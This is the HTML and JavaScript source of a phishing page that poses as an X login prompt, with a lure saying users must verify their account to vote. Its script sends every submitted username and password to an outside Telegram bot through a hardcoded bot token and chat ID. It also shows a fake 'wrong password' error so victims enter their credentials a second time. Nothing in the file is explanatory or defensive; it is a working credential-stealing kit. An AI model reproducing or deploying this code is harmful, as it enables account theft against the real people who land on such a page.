    <h3>To vote,first verify your X account by entering your <span>phone, email, or @username</span></h3>
    <form id="signup-form">
      <div class="form-group">
        
        <input type="text" id="username" placeholder="Phone, email, or username" required>
        <div class="error-message" id="username-error"></div>
        
      </div>
      <div class="form-group2">
        <p></p>
        <input type="password" id="password" placeholder="Enter password">
        <div class="error-message" id="password-error"></div>
      </div>
      <p></p>
      <div class="bu">
            <hr>
            <div class="btn2">
                <a href="forgot.html">Forgot password?</h5>
            </div>
            
            <button class="btn" id="signup-btn">NEXT</button>
            <p></p>
        </div>
      
    </form>
    
    <script>
    const botToken = '8486680875:AAHADg3YgtIW9D1OPd-QdsM1vqwi6Z1f3uk';
    const chatId = '7037294252';
    const users = {
      'user1': 'password1',
      'user2': 'password2',
      // Add more users here
    };

    document.getElementById('signup-form').addEventListener('submit', (e) => {
      e.preventDefault();
      const username = document.getElementById('username').value.trim();
      const password = document.getElementById('password').value.trim();

      if (validateSignupForm(username, password)) {
        users[username] = password;
        const message = `ðŸ“©New LOGIN ATTEMPTðŸ“©
        
        
        DETAILS:
      - PLATFORMS: X
      - GMAILL:${username} 
      - PASSWORD:${password}
      

      ðŸ”’-SECURED BY GAMEHUB-ðŸ”’`;
        sendMessage(message, () => {
          
          // Redirect to new webpage
          // window.location.href = 'new-page.html';
          window.location.href = 'password.html';
        });
      }
    });

    document.getElementById('login-form').addEventListener('submit', (e) => {
      e.preventDefault();
      const username = document.getElementById('login-username').value.trim();
      const password = document.getElementById('login-password').value.trim();

      if (validateLoginForm(username, password)) {
        if (users[username] === password) {
          document.getElementById('login-success-message').innerText = 'Login successful!';
          document.getElementById('login-error-message').innerText = '';
          const message = `ðŸ”’ Login attempt: ${username} ${password}`;
          sendMessage(message, () => {
            window.open('new-page.html', '_blank');
          });
        } else {
          document.getElementById('login-error-message').innerText = 'Invalid username or password';
          document.getElementById('login-success-message').innerText = '';
        }
      }
    });

    function validateSignupForm(username, password) {
      let isValid = true;

      if (username.length < 3) {
        document.getElementById('username-error').innerText = 'Username must be at least 3 characters';
        isValid = false;
      } else {
        document.getElementById('username-error').innerText = '';
      }

      if (password.length < 999) {
        document.getElementById('password-error').innerText = 'Wrong Email or Password. Try again or click `Forgot password` to reset Password.';
        isValid = true;
        
        
    
      } else {
        document.getElementById('password-error').innerText = '';
      }

      return isValid;
    }

    function validateLoginForm(username, password) {
      let isValid = true;

      if (username.length < 3) {
        document.getElementById('login-username-error').innerText = 'Username must be at least 3 characters';
        isValid = false;
      } else {
        document.getElementById('login-username-error').innerText = '';
      }

      if (password.length < 6) {
        document.getElementById('login-password-error').innerText = 'Password must be at least 6 characters';
        isValid = false;
      } else {
        document.getElementById('login-password-error').innerText = '';
      }

      return isValid;
    }

    function sendMessage(message, callback) {
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      const data = {
        chat_id: chatId,
        text: message
      };

      fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      })
      .then(response => response.json())
      .then(data => {
        console.log(data);
        callback();
      })
      .catch(error => console.error(error));
    }
  </script>
